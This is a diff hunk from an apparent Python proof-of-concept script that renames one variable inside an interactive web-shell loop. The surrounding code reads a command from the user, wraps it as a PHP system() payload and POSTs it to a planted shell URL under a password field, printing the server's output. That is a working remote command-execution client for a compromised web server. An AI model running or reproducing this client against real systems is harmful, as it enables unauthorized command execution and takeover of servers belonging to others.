@@ -45,10 +45,10 @@ def poc():
 				command = raw_input("[*] input the command:")
 				payload= 'system("%s");' % command
 				if command != "exit":
-					postdata = {
+					postData = {
 						password : payload
 					}
-					r = requests.post(shell, data=postdata)
+					r = requests.post(shell, data=postData)
 					print(r.text.encode(r.encoding))
 				else:
 					break
